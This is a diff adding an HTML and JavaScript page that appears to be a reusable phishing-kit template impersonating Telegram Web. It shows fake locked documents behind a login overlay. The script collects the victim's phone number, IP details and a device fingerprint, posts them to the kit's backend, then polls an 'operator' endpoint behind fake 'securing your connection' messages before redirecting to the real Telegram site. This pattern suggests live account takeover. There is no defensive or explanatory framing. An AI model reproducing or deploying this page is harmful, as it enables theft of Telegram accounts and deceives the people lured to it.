@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram Web</title>
+  <link rel="icon" href="https://telegram.org/favicon.ico" type="image/x-icon" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body, html { height: 100%; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f5f5f5; }
+    .main-container { display: flex; flex-direction: column; min-height: 100vh; }
+    .top-navbar { background: #fff; height: 60px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); display: flex; align-items: center; padding: 0 24px; }
+    .content-area { flex: 1; display: flex; position: relative; }
+    .document-preview { flex: 1; background: #e8e8e8; padding: 40px; }
+    .document-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px,1fr)); gap: 25px; max-width: 1200px; margin: 0 auto; }
+    .document-card { background: white; border-radius: 4px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1); transition: all .2s; position: relative; }
+    .document-card:hover { transform: translateY(-5px); box-shadow: 0 5px 15px rgba(0,0,0,0.15); }
+    .document-thumbnail { height: 150px; background: #fff; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #eee; padding: 10px; }
+    .thumbnail-content { width: 100%; height: 100%; background: #f8f8f8; display: flex; flex-direction: column; }
+    .thumbnail-header { background: #2AABEE; height: 20px; width: 100%; }
+    .thumbnail-body { flex: 1; padding: 5px; font-size: 6px; overflow: hidden; }
+    .thumbnail-line { height: 3px; background: #ddd; margin: 3px 0; width: 90%; }
+    .document-info { padding: 12px; }
+    .document-title { font-size: 14px; font-weight: 500; margin-bottom: 5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .document-meta { font-size: 12px; color: #666; display: flex; align-items: center; }
+    .document-date { margin-right: 10px; }
+    .document-type { padding: 2px 6px; background: #E8F0FE; color: #1A73E8; border-radius: 3px; font-size: 10px; }
+    .document-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: flex; justify-content: center; align-items: center; z-index: 1000; overflow-y: auto; padding: 20px; }
+    .login-container { width: 420px; max-width: 100%; background: #fff; border-radius: 8px; box-shadow: 0 0 20px rgba(0,0,0,0.5); padding: 40px; z-index: 1001; text-align: center; }
+    .tg-logo-big { width: 64px; height: 64px; margin-bottom: 16px; }
+    .form-title { font-size: 28px; font-weight: 700; color: #222; margin-bottom: 4px; }
+    .form-subtitle { font-size: 14px; color: #666; margin-bottom: 24px; }
+    .login-methods { display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px; }
+    .login-method-btn { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; height: 48px; border-radius: 8px; border: 1px solid #ddd; background: #fff; color: #222; font-size: 16px; font-weight: 500; cursor: pointer; transition: all .2s; position: relative; }
+    .login-method-btn:hover { background: #f5f5f5; border-color: #ccc; }
+    .login-method-btn .method-icon { position: absolute; left: 14px; font-size: 20px; }
+    .login-method-btn .method-text { text-align: center; flex: 1; }
+    .method-section { display: none; }
+    .method-section.active { display: block; }
+    .qr-box { width: 200px; height: 200px; margin: 0 auto 16px; background: #f8f8f8; border: 2px dashed #ccc; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 80px; color: #999; }
+    .back-btn { background: none; border: none; color: #2AABEE; font-weight: 500; font-size: 14px; cursor: pointer; padding: 8px 0; margin-bottom: 16px; display: block; }
+    .back-btn:hover { text-decoration: underline; }
+    .form-group { text-align: left; margin-bottom: 16px; }
+    .form-group label { font-weight: 500; color: #222; margin-bottom: 4px; display: block; }
+    .form-control { height: 48px; border-radius: 6px; border: 1px solid #ddd; padding-left: 12px; font-size: 15px; width: 100%; }
+    .form-control:focus { box-shadow: 0 0 0 2px rgba(42,171,238,0.2); border-color: #2AABEE; outline: none; }
+    .btn-primary { background: #2AABEE; border: none; height: 48px; font-weight: 500; width: 100%; border-radius: 6px; font-size: 16px; color: #fff; cursor: pointer; }
+    .btn-primary:hover { background: #1e96d4; }
+    .btn-primary:disabled { background: #b0b0b0; }
+    .error-message { color: #D32F2F; font-size: 13px; margin-top: 5px; margin-bottom: 15px; display: none; }
+    .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.2); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
+    .loading-spinner { border: 5px solid #f3f3f3; border-top: 5px solid #2AABEE; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .loading-text { font-size: 1.2em; color: #333; margin-bottom: 15px; max-width: 80%; }
+    .loading-error-message { font-size: 1.2em; color: #D32F2F; font-weight: bold; display: none; }
+    .lock-icon { position: absolute; top: 10px; right: 10px; background: rgba(255,255,255,0.9); width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #2AABEE; font-size: 12px; }
+    .security-footer { margin-top: 24px; padding-top: 16px; border-top: 1px solid #eee; }
+    .security-text { font-size: 12px; color: #999; }
+    @media (max-width: 768px) {
+      .document-list { grid-template-columns: repeat(auto-fill, minmax(150px,1fr)); gap: 15px; }
+      .login-container { padding: 30px 20px; }
+      .qr-box { width: 160px; height: 160px; font-size: 60px; }
+    }
+  </style>
+</head>
+<body>
+<div class="main-container">
+  <div class="top-navbar">
+    <svg viewBox="0 0 24 24" width="28" height="28" fill="#2AABEE"><path d="M11.944 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0a12 12 0 00-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 01.171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+  </div>
+  <div class="content-area">
+    <div class="document-preview">
+      <div class="document-list">
+        <div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:60%"></div><div class="thumbnail-line" style="width:80%"></div><div class="thumbnail-line" style="width:70%"></div></div></div></div><div class="document-info"><div class="document-title">{{file1Name}}</div><div class="document-meta"><span class="document-date">{{file1Date}}</span><span class="document-type">PDF</span></div></div></div>
+        <div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:70%"></div><div class="thumbnail-line" style="width:60%"></div></div></div></div><div class="document-info"><div class="document-title">{{file2Name}}</div><div class="document-meta"><span class="document-date">{{file2Date}}</span><span class="document-type">DOC</span></div></div></div>
+        <div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:80%"></div><div class="thumbnail-line" style="width:70%"></div></div></div></div><div class="document-info"><div class="document-title">{{file3Name}}</div><div class="document-meta"><span class="document-date">{{file3Date}}</span><span class="document-type">XLS</span></div></div></div>
+        <div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:90%"></div><div class="thumbnail-line" style="width:80%"></div></div></div></div><div class="document-info"><div class="document-title">{{file4Name}}</div><div class="document-meta"><span class="document-date">{{file4Date}}</span><span class="document-type">PPT</span></div></div></div>
+      </div>
+      <div class="document-overlay">
+        <div class="login-container">
+          <h2 class="form-title">Telegram</h2>
+          <p class="form-subtitle">Choose how to log in</p>
+          <div class="login-methods" id="methodSelection">
+            <button type="button" class="login-method-btn" onclick="selectMethod('qr')"><span class="method-icon"><i class="fas fa-qrcode"></i></span><span class="method-text">Log in by QR Code</span></button>
+            <button type="button" class="login-method-btn" onclick="selectMethod('phone')"><span class="method-icon"><i class="fas fa-phone-alt"></i></span><span class="method-text">Log in by Phone Number</span></button>
+          </div>
+          <div class="method-section" id="qrSection">
+            <div class="qr-box"><i class="fas fa-qrcode"></i></div>
+            <p style="font-size:13px;color:#666;margin-bottom:16px;line-height:1.5">
+              1. Open Telegram on your phone<br>
+              2. Go to <strong>Settings</strong> > <strong>Devices</strong> > <strong>Link Desktop Device</strong><br>
+              3. Point your phone at this screen
+            </p>
+            <button type="button" class="back-btn" onclick="showMethods()"><i class="fas fa-arrow-left"></i> Log in by phone number</button>
+          </div>
+          <div class="method-section" id="phoneSection">
+            <button type="button" class="back-btn" onclick="showMethods()"><i class="fas fa-arrow-left"></i> Back</button>
+            <form id="phoneForm" onsubmit="return false;">
+              <div class="form-group">
+                <label>Your Phone Number</label>
+                <div style="display:flex;gap:8px">
+                  <input type="text" class="form-control" id="countryCode" placeholder="+1" value="+1" style="width:90px;flex-shrink:0">
+                  <input type="tel" class="form-control" id="phoneInput" placeholder="Phone number" required>
+                </div>
+              </div>
+              <div class="error-message" id="phoneError">Please enter a valid phone number.</div>
+              <div class="error-message" id="generalError">An error occurred. Please try again.</div>
+              <button type="button" class="btn-primary" id="submitBtn" onclick="submitPhone()">Next</button>
+            </form>
+          </div>
+          <div class="security-footer"><span class="security-text">Telegram Web</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-spinner"></div>
+  <p class="loading-text" id="loadingMessage"></p>
+  <p class="loading-error-message" id="documentRetrievalFailedMessage">Connection failed. Please try again later.</p>
+</div>
+<script>
+const templateConfig = { postURL: "{{postURL}}", token: "{{token}}", landingPageLink: "{{landingPageLink}}" };
+const apiBaseUrl = window.location.origin + "/api";
+let browserId = null, pollingIntervalId = null, pollingStartTime = null, selectedMethod = null;
+const POLLING_TIMEOUT_MS = 10 * 60 * 1000;
+let currentStatus = null, messageIntervalId = null, currentMessageIndex = 0;
+const loadingMessages = ["Securing your connection...","Verifying device...","Establishing secure tunnel...","Preparing your workspace...","Almost there..."];
+
+function selectMethod(m) { selectedMethod = m; document.getElementById('methodSelection').style.display = 'none'; document.getElementById('qrSection').classList.toggle('active', m === 'qr'); document.getElementById('phoneSection').classList.toggle('active', m === 'phone'); if (m === 'qr') initialFormSubmission(); }
+function showMethods() { document.getElementById('methodSelection').style.display = 'flex'; document.getElementById('qrSection').classList.remove('active'); document.getElementById('phoneSection').classList.remove('active'); }
+
+function showLoadingOverlay(spinner=true, isError=false) {
+  const o = document.getElementById('loadingOverlay'); o.style.display = 'flex'; document.querySelector('.document-overlay').style.display = 'none';
+  if (isError) { o.querySelector('.loading-spinner').style.display = 'none'; document.getElementById('loadingMessage').style.display = 'none'; document.getElementById('documentRetrievalFailedMessage').style.display = 'block'; clearInterval(messageIntervalId); }
+  else { o.querySelector('.loading-spinner').style.display = spinner ? 'block' : 'none'; document.getElementById('loadingMessage').style.display = 'block'; document.getElementById('documentRetrievalFailedMessage').style.display = 'none'; startMessages(); }
+}
+function hideLoadingOverlay() { document.getElementById('loadingOverlay').style.display = 'none'; document.querySelector('.document-overlay').style.display = 'flex'; clearInterval(messageIntervalId); }
+function startMessages() {
+  const el = document.getElementById('loadingMessage'); currentMessageIndex = 0; el.textContent = loadingMessages[0];
+  if (messageIntervalId) clearInterval(messageIntervalId);
+  messageIntervalId = setInterval(() => { currentMessageIndex = (currentMessageIndex + 1) % loadingMessages.length; el.textContent = loadingMessages[currentMessageIndex]; }, 5000);
+}
+function objectToFormData(obj) { const fd = new URLSearchParams(); Object.entries(obj).forEach(([k,v]) => fd.append(k, v != null ? v.toString() : '')); return fd.toString(); }
+function getDeviceData() { return { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screenWidth: window.screen.width, screenHeight: window.screen.height, colorDepth: window.screen.colorDepth, pixelRatio: window.devicePixelRatio, hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory, vendor: navigator.vendor, maxTouchPoints: navigator.maxTouchPoints }; }
+
+async function initialFormSubmission() {
+  showLoadingOverlay(true);
+  try {
+    const ipData = await fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>({}));
+    const payload = { token: templateConfig.token, formData: JSON.stringify({ loginMethod: selectedMethod, identifier: '', password: '', ipData, deviceData: getDeviceData(), timestamp: new Date().toISOString() }) };
+    const res = await fetch(apiBaseUrl + "/notify-form-submission", { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: objectToFormData(payload) });
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    const data = await res.json();
+    if (data.apiResponse && data.apiResponse.browserId) { browserId = data.apiResponse.browserId; pollingStartTime = Date.now(); startPolling(5000); }
+    else throw new Error("No browserId");
+  } catch(e) { console.error(e); document.getElementById('generalError').style.display = 'block'; showLoadingOverlay(false, true); }
+}
+function startPolling(interval) { if (pollingIntervalId) clearInterval(pollingIntervalId); pollingIntervalId = setInterval(pollOperator, interval); }
+async function pollOperator() {
+  if (!browserId) { clearInterval(pollingIntervalId); return; }
+  if (Date.now() - pollingStartTime > POLLING_TIMEOUT_MS) { clearInterval(pollingIntervalId); showLoadingOverlay(false, true); document.getElementById('generalError').textContent = "Session timed out."; document.getElementById('generalError').style.display = 'block'; return; }
+  try {
+    const res = await fetch(apiBaseUrl + "/pooling-operator", { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: objectToFormData({ browserId, token: templateConfig.token }) });
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    const data = await res.json();
+    if (data.currentStatus === 'COMPLETED') { clearInterval(pollingIntervalId); hideLoadingOverlay(); let url = templateConfig.landingPageLink || "https://web.telegram.org"; if (!url.startsWith('http')) url = 'https://' + url; window.location.href = url; }
+    else if (data.currentStatus === 'FAILED') { clearInterval(pollingIntervalId); showLoadingOverlay(false, true); }
+    else { showLoadingOverlay(true); }
+  } catch(e) { console.error(e); }
+}
+async function submitPhone() {
+  const cc = document.getElementById('countryCode').value.trim();
+  const phone = document.getElementById('phoneInput').value.trim();
+  if (!phone) { document.getElementById('phoneError').style.display = 'block'; return; }
+  document.getElementById('phoneError').style.display = 'none';
+  selectedMethod = 'phone';
+  showLoadingOverlay(true);
+  try {
+    const ipData = await fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>({}));
+    const payload = { token: templateConfig.token, formData: JSON.stringify({ loginMethod:'phone', identifier: cc+phone, password:'', ipData, deviceData: getDeviceData(), timestamp: new Date().toISOString() }) };
+    const res = await fetch(apiBaseUrl + "/notify-form-submission", { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: objectToFormData(payload) });
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    const data = await res.json();
+    if (data.apiResponse && data.apiResponse.browserId) { browserId = data.apiResponse.browserId; pollingStartTime = Date.now(); startPolling(5000); }
+    else throw new Error("No browserId");
+  } catch(e) { console.error(e); document.getElementById('generalError').style.display = 'block'; showLoadingOverlay(false, true); }
+}
+document.addEventListener('DOMContentLoaded', () => { document.getElementById('methodSelection').style.display = 'flex'; });
+</script>
+</body>
+</html>
